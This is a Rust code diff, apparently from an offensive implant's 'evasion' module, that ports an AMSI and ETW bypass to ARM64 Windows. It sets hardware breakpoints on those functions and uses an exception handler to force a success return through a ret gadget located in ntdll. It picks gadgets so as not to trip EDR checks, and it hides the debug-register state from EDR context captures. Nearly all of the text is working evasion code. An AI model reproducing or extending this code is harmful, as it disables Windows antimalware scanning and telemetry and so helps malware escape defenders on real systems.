@@ -25,6 +25,129 @@ static ETW_ADDR: AtomicUsize = AtomicUsize::new(0);
 #[cfg(windows)]
 static RET_GADGET: AtomicUsize = AtomicUsize::new(0);
 
+#[cfg(all(windows, target_arch = "x86_64"))]
+unsafe fn context_ip(context: *mut winapi::um::winnt::CONTEXT) -> usize {
+    (*context).Rip as usize
+}
+
+#[cfg(all(windows, target_arch = "aarch64"))]
+unsafe fn context_ip(context: *mut winapi::um::winnt::CONTEXT) -> usize {
+    (*context).Pc as usize
+}
+
+#[cfg(all(windows, target_arch = "x86_64"))]
+unsafe fn context_set_return_success_and_redirect(
+    context: *mut winapi::um::winnt::CONTEXT,
+    gadget: usize,
+) {
+    (*context).Rax = 0;
+    (*context).Rip = gadget as u64;
+}
+
+#[cfg(all(windows, target_arch = "aarch64"))]
+unsafe fn context_set_return_success_and_redirect(
+    context: *mut winapi::um::winnt::CONTEXT,
+    gadget: usize,
+) {
+    (*context).u.s_mut().X0 = 0;
+    (*context).Pc = gadget as u64;
+}
+
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn hwbp_set_slots(ctx: &mut winapi::um::winnt::CONTEXT, amsi: usize, etw: usize) {
+    ctx.Dr0 = amsi as u64;
+    ctx.Dr1 = etw as u64;
+    ctx.Dr7 |= (1 << 0) | (1 << 2);
+}
+
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn hwbp_set_slots(ctx: &mut winapi::um::winnt::CONTEXT, amsi: usize, etw: usize) {
+    const ARM64_BCR_EL0_EXECUTE: u32 = 0x5;
+    ctx.Bvr[0] = amsi as u64;
+    ctx.Bvr[1] = etw as u64;
+    ctx.Bcr[0] = ARM64_BCR_EL0_EXECUTE;
+    ctx.Bcr[1] = ARM64_BCR_EL0_EXECUTE;
+}
+
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn hwbp_slots_match(
+    actual: &winapi::um::winnt::CONTEXT,
+    expected: &winapi::um::winnt::CONTEXT,
+) -> bool {
+    actual.Dr0 == expected.Dr0
+        && actual.Dr1 == expected.Dr1
+        && (actual.Dr7 & ((1 << 0) | (1 << 2))) == (expected.Dr7 & ((1 << 0) | (1 << 2)))
+}
+
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn hwbp_slots_match(
+    actual: &winapi::um::winnt::CONTEXT,
+    expected: &winapi::um::winnt::CONTEXT,
+) -> bool {
+    actual.Bvr[0] == expected.Bvr[0]
+        && actual.Bvr[1] == expected.Bvr[1]
+        && (actual.Bcr[0] & 1) == (expected.Bcr[0] & 1)
+        && (actual.Bcr[1] & 1) == (expected.Bcr[1] & 1)
+}
+
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn hwbp_slot_values(ctx: &winapi::um::winnt::CONTEXT) -> (u64, u64) {
+    (ctx.Dr0, ctx.Dr1)
+}
+
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn hwbp_slot_values(ctx: &winapi::um::winnt::CONTEXT) -> (u64, u64) {
+    (ctx.Bvr[0], ctx.Bvr[1])
+}
+
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn hwbp_clear_if_owned(ctx: &mut winapi::um::winnt::CONTEXT, amsi: usize, etw: usize) {
+    if (ctx.Dr0 == amsi as u64) || (ctx.Dr1 == etw as u64) {
+        ctx.Dr0 = 0;
+        ctx.Dr1 = 0;
+        ctx.Dr7 &= !((1u64 << 0) | (1u64 << 2));
+    }
+}
+
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn hwbp_clear_if_owned(ctx: &mut winapi::um::winnt::CONTEXT, amsi: usize, etw: usize) {
+    if (ctx.Bvr[0] == amsi as u64) || (ctx.Bvr[1] == etw as u64) {
+        ctx.Bvr[0] = 0;
+        ctx.Bvr[1] = 0;
+        ctx.Bcr[0] &= !1;
+        ctx.Bcr[1] &= !1;
+    }
+}
+
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn hwbp_restore_slots(ctx: &mut winapi::um::winnt::CONTEXT, saved: &SavedDebugRegs) {
+    ctx.Dr0 = saved.dr0;
+    ctx.Dr1 = saved.dr1;
+    if saved.dr0 != 0 {
+        ctx.Dr7 |= 1 << 0;
+    }
+    if saved.dr1 != 0 {
+        ctx.Dr7 |= 1 << 2;
+    }
+}
+
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn hwbp_restore_slots(ctx: &mut winapi::um::winnt::CONTEXT, saved: &SavedDebugRegs) {
+    const ARM64_BCR_EL0_EXECUTE: u32 = 0x5;
+    ctx.Bvr[0] = saved.dr0;
+    ctx.Bvr[1] = saved.dr1;
+    ctx.Bcr[0] = if saved.dr0 != 0 {
+        ARM64_BCR_EL0_EXECUTE
+    } else {
+        0
+    };
+    ctx.Bcr[1] = if saved.dr1 != 0 {
+        ARM64_BCR_EL0_EXECUTE
+    } else {
+        0
+    };
+}
+
 /// Handle returned by `AddVectoredExceptionHandler`, stored as a `usize`.
 /// Zero means no handler is registered.  Uses `AtomicUsize` (not `OnceLock`)
 /// so that `disable_evasion` can reset it after removal.
@@ -39,27 +162,23 @@ unsafe extern "system" fn veh_handler(
     let context = (*exception_info).ContextRecord;
 
     if (*record).ExceptionCode == winapi::um::winnt::STATUS_SINGLE_STEP {
-        let rip = (*context).Rip as usize;
+        let ip = context_ip(context);
         let amsi = AMSI_ADDR.load(Ordering::Relaxed);
         let etw = ETW_ADDR.load(Ordering::Relaxed);
 
-        if (amsi != 0 && rip == amsi) || (etw != 0 && rip == etw) {
-            // Bypass by clearing RAX (returning 0) and advancing RIP to a
+        if (amsi != 0 && ip == amsi) || (etw != 0 && ip == etw) {
+            // Bypass by clearing the ABI return register and advancing IP to a
             // pre-computed ret gadget.  The gadget address was resolved and
             // validated with NtQueryVirtualMemory during setup_hardware_breakpoints,
             // before this handler was registered.  Scanning memory or calling
             // NtQueryVirtualMemory here would risk deadlock (loader-lock / heap-lock
             // contention inside a VEH handler).
-            (*context).Rax = 0;
             let gadget = RET_GADGET.load(Ordering::Relaxed);
             if gadget == 0 {
                 // Gadget was not resolved at setup time; propagate the exception.
                 return winapi::vc::excpt::EXCEPTION_CONTINUE_SEARCH;
             }
-            // Redirect RIP to the ret gadget.  The CPU will pop [Rsp] into Rip
-            // and advance Rsp by 8 (or 8+N for ret N), cleanly returning from
-            // the intercepted AMSI/ETW function to its caller.
-            (*context).Rip = gadget as u64;
+            context_set_return_success_and_redirect(context, gadget);
             return winapi::vc::excpt::EXCEPTION_CONTINUE_EXECUTION;
         }
     }
@@ -241,7 +360,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                 }
             }
 
-            // Scan up to 64 bytes for 0xC3 (ret), verifying each page with
+            // Scan up to 64 bytes for a return instruction, verifying each page with
             // NtQueryVirtualMemory before the first dereference on that page.
             let mut last_page: usize = usize::MAX;
             for _ in 0..64usize {
@@ -271,37 +390,64 @@ pub unsafe fn setup_hardware_breakpoints() {
                     last_page = page;
                 }
 
-                if *p == 0xC3 {
-                    // `ret` is 1 byte — always within its page.
-                    // Validate the gadget is within ntdll's address range.
-                    // A hooked NtClose may redirect us to EDR memory where a
-                    // ret gadget would be a strong detection signal.
-                    if ntdll_end > 0 && (addr < ntdll_base || addr >= ntdll_end) {
-                        log::warn!("evasion: ret gadget at {:#x} is outside ntdll range [{:#x},{:#x}) — possible EDR hook, skipping", addr, ntdll_base, ntdll_end);
-                        p = p.add(1);
-                        continue;
-                    }
-                    RET_GADGET.store(addr, Ordering::Relaxed);
-                    log::debug!("evasion: ret gadget pre-computed at {:#x}", addr);
-                    break 'gadget;
-                }
-
-                // Skip 0xC2 (ret N, 3 bytes) if it would straddle a page boundary.
-                if *p == 0xC2 {
-                    if addr + 3 <= (page + 0x1000) {
+                #[cfg(target_arch = "x86_64")]
+                {
+                    if *p == 0xC3 {
+                        // `ret` is 1 byte — always within its page.
                         // Validate the gadget is within ntdll's address range.
+                        // A hooked NtClose may redirect us to EDR memory where a
+                        // ret gadget would be a strong detection signal.
                         if ntdll_end > 0 && (addr < ntdll_base || addr >= ntdll_end) {
-                            log::warn!("evasion: ret-N gadget at {:#x} is outside ntdll range [{:#x},{:#x}) — possible EDR hook, skipping", addr, ntdll_base, ntdll_end);
+                            log::warn!("evasion: ret gadget at {:#x} is outside ntdll range [{:#x},{:#x}) — possible EDR hook, skipping", addr, ntdll_base, ntdll_end);
                             p = p.add(1);
                             continue;
                         }
                         RET_GADGET.store(addr, Ordering::Relaxed);
-                        log::debug!("evasion: ret-N gadget pre-computed at {:#x}", addr);
+                        log::debug!("evasion: ret gadget pre-computed at {:#x}", addr);
+                        break 'gadget;
                     }
-                    break 'gadget;
+
+                    // Skip 0xC2 (ret N, 3 bytes) if it would straddle a page boundary.
+                    if *p == 0xC2 {
+                        if addr + 3 <= (page + 0x1000) {
+                            // Validate the gadget is within ntdll's address range.
+                            if ntdll_end > 0 && (addr < ntdll_base || addr >= ntdll_end) {
+                                log::warn!("evasion: ret-N gadget at {:#x} is outside ntdll range [{:#x},{:#x}) — possible EDR hook, skipping", addr, ntdll_base, ntdll_end);
+                                p = p.add(1);
+                                continue;
+                            }
+                            RET_GADGET.store(addr, Ordering::Relaxed);
+                            log::debug!("evasion: ret-N gadget pre-computed at {:#x}", addr);
+                        }
+                        break 'gadget;
+                    }
+
+                    p = p.add(1);
                 }
 
-                p = p.add(1);
+                #[cfg(target_arch = "aarch64")]
+                {
+                    if addr % 4 == 0 && addr + 4 <= (page + 0x1000) {
+                        let insn = std::ptr::read_unaligned(p as *const u32);
+                        if insn == 0xD65F_03C0 {
+                            if ntdll_end > 0 && (addr < ntdll_base || addr >= ntdll_end) {
+                                log::warn!("evasion: ARM64 ret gadget at {:#x} is outside ntdll range [{:#x},{:#x}) — possible EDR hook, skipping", addr, ntdll_base, ntdll_end);
+                                p = p.add(4);
+                                continue;
+                            }
+                            RET_GADGET.store(addr, Ordering::Relaxed);
+                            log::debug!("evasion: ARM64 ret gadget pre-computed at {:#x}", addr);
+                            break 'gadget;
+                        }
+                    }
+
+                    p = p.add(if addr % 4 == 0 { 4 } else { 4 - (addr % 4) });
+                }
+
+                #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
+                {
+                    p = p.add(1);
+                }
             }
 
             // Fallback: if no valid ntdll ret gadget was found, resolve
@@ -313,11 +459,18 @@ pub unsafe fn setup_hardware_breakpoints() {
                 )
                 .unwrap_or(0);
                 if peb_fn != 0 {
-                    // RtlGetCurrentPeb is typically: mov rax, gs:[60h]; ret
-                    // Scan the first 16 bytes for a 0xC3.
+                    // RtlGetCurrentPeb is a tiny leaf routine that ends with ret.
                     let q = peb_fn as *const u8;
                     for i in 0..16usize {
-                        if *q.add(i) == 0xC3 {
+                        #[cfg(target_arch = "x86_64")]
+                        let found = *q.add(i) == 0xC3;
+                        #[cfg(target_arch = "aarch64")]
+                        let found = i % 4 == 0
+                            && std::ptr::read_unaligned(q.add(i) as *const u32) == 0xD65F_03C0;
+                        #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
+                        let found = false;
+
+                        if found {
                             let gadget = peb_fn + i;
                             // Verify it's within ntdll (should always be).
                             if ntdll_end == 0 || (gadget >= ntdll_base && gadget < ntdll_end) {
@@ -483,11 +636,11 @@ pub unsafe fn setup_hardware_breakpoints() {
                             continue;
                         }
 
-                        // Modify debug registers.
-                        ctx.Dr0 = AMSI_ADDR.load(Ordering::Relaxed) as u64;
-                        ctx.Dr1 = ETW_ADDR.load(Ordering::Relaxed) as u64;
-                        // Enable local breakpoints for Dr0 (bit 0) and Dr1 (bit 2)
-                        ctx.Dr7 |= (1 << 0) | (1 << 2);
+                        hwbp_set_slots(
+                            &mut ctx,
+                            AMSI_ADDR.load(Ordering::Relaxed),
+                            ETW_ADDR.load(Ordering::Relaxed),
+                        );
 
                         let set_fallback = {
                             let s = crate::syscall!(
@@ -536,17 +689,14 @@ pub unsafe fn setup_hardware_breakpoints() {
                                 verify_fallback
                             };
 
-                            if !verify_ok
-                                || verify_ctx.Dr0 != ctx.Dr0
-                                || verify_ctx.Dr1 != ctx.Dr1
-                                || (verify_ctx.Dr7 & ((1 << 0) | (1 << 2)))
-                                    != (ctx.Dr7 & ((1 << 0) | (1 << 2)))
-                            {
+                            if !verify_ok || !hwbp_slots_match(&verify_ctx, &ctx) {
+                                let (actual0, actual1) = hwbp_slot_values(&verify_ctx);
+                                let (expected0, expected1) = hwbp_slot_values(&ctx);
                                 log::warn!(
-                                    "evasion: SetThreadContext verification failed for tid {} — Dr0={:#x} (expected {:#x}), Dr1={:#x} (expected {:#x}), restoring original context",
+                                    "evasion: SetThreadContext verification failed for tid {} — HWBP0={:#x} (expected {:#x}), HWBP1={:#x} (expected {:#x}), restoring original context",
                                     te32.th32ThreadID,
-                                    verify_ctx.Dr0, ctx.Dr0,
-                                    verify_ctx.Dr1, ctx.Dr1,
+                                    actual0, expected0,
+                                    actual1, expected1,
                                 );
                                 // Restore original debug registers.
                                 if _orig_saved {
@@ -770,9 +920,7 @@ pub unsafe fn apply_hwbp_to_current_thread() {
         return;
     }
 
-    ctx.Dr0 = amsi as u64;
-    ctx.Dr1 = etw as u64;
-    ctx.Dr7 |= (1 << 0) | (1 << 2); // enable local breakpoints for Dr0 and Dr1
+    hwbp_set_slots(&mut ctx, amsi, etw);
 
     let set_ok = if let Some(nt_set) = nt_set_ctx {
         let status = nt_set(h, &mut ctx);
@@ -822,15 +970,13 @@ pub unsafe fn apply_hwbp_to_current_thread() {
         s.is_ok() && s.unwrap() >= 0
     };
 
-    if !verify_ok
-        || verify_ctx.Dr0 != ctx.Dr0
-        || verify_ctx.Dr1 != ctx.Dr1
-        || (verify_ctx.Dr7 & ((1 << 0) | (1 << 2))) != (ctx.Dr7 & ((1 << 0) | (1 << 2)))
-    {
+    if !verify_ok || !hwbp_slots_match(&verify_ctx, &ctx) {
+        let (actual0, actual1) = hwbp_slot_values(&verify_ctx);
+        let (expected0, expected1) = hwbp_slot_values(&ctx);
         log::warn!(
-            "evasion: apply_hwbp_to_current_thread: SetThreadContext verification failed — Dr0={:#x} (expected {:#x}), Dr1={:#x} (expected {:#x}), restoring original context",
-            verify_ctx.Dr0, ctx.Dr0,
-            verify_ctx.Dr1, ctx.Dr1,
+            "evasion: apply_hwbp_to_current_thread: SetThreadContext verification failed — HWBP0={:#x} (expected {:#x}), HWBP1={:#x} (expected {:#x}), restoring original context",
+            actual0, expected0,
+            actual1, expected1,
         );
         // Restore original debug registers.
         if orig_saved {
@@ -900,7 +1046,7 @@ pub unsafe fn disable_evasion() {}
 // clear Dr0/Dr1 around sensitive syscalls so the debug registers appear clean
 // to any EDR context capture.
 
-/// Saved debug register pair (Dr0, Dr1).
+/// Saved hardware-breakpoint slot addresses.
 #[cfg(windows)]
 struct SavedDebugRegs {
     dr0: u64,
@@ -957,18 +1103,16 @@ unsafe fn save_and_clear_debug_regs() -> SavedDebugRegs {
         return SavedDebugRegs { dr0: 0, dr1: 0 };
     }
 
+    let (slot0, slot1) = hwbp_slot_values(&ctx);
     let saved = SavedDebugRegs {
-        dr0: ctx.Dr0,
-        dr1: ctx.Dr1,
+        dr0: slot0,
+        dr1: slot1,
     };
 
     // Only clear if they actually hold our breakpoint addresses.
-    if (ctx.Dr0 == amsi as u64) || (ctx.Dr1 == etw as u64) {
-        ctx.Dr0 = 0;
-        ctx.Dr1 = 0;
-        // Disable Dr0 and Dr1 local breakpoint enables (bits 0 and 2).
-        ctx.Dr7 &= !((1u64 << 0) | (1u64 << 2));
-
+    let before_clear = hwbp_slot_values(&ctx);
+    hwbp_clear_if_owned(&mut ctx, amsi, etw);
+    if hwbp_slot_values(&ctx) != before_clear {
         if let Some(nt_set_fn) = nt_set {
             nt_set_fn(h, &mut ctx);
         } else {
@@ -1021,14 +1165,7 @@ unsafe fn restore_debug_regs(saved: SavedDebugRegs) {
         return;
     }
 
-    ctx.Dr0 = saved.dr0;
-    ctx.Dr1 = saved.dr1;
-    if saved.dr0 != 0 {
-        ctx.Dr7 |= 1 << 0; // Re-enable local breakpoint for Dr0.
-    }
-    if saved.dr1 != 0 {
-        ctx.Dr7 |= 1 << 2; // Re-enable local breakpoint for Dr1.
-    }
+    hwbp_restore_slots(&mut ctx, &saved);
 
     if let Some(nt_set_fn) = nt_set {
         nt_set_fn(h, &mut ctx);
